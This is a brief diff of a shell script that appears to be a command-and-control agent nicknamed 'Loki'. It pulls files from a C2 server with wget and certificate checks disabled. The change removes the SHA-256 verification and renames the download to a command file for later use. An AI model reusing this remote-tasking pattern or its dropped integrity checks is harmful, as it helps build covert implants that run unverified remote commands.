@@ -19,9 +19,10 @@ if [ -f "$LOKIHOME/$MYNAME" ]; then
         $WGET -O $LOKIHOME/$MYNAME.hash --no-check-certificate "$C2PROTO$C2/$MYNAME.hash"
 
         # Create a hash of the file that we downloaded to compare to the hash that we downloaded
-    sha256sum $LOKIHOME/$MYNAME > $LOKIHOME/$MYNAME.check
-	$DIFF $LOKIHOME/$MYNAME.hash $LOKIHOME/$MYNAME.check
-	
+		
+		# Hashing isn't working, let's go through the rest of the functionality and come back to it.
+		$MV $LOKIHOME/$MYNAME $LOKIHOME/$MYNAME-command.txt
+		
 else
     $ECHO "No $LOKIHOME/$MYNAME-command.txt found"
 fi
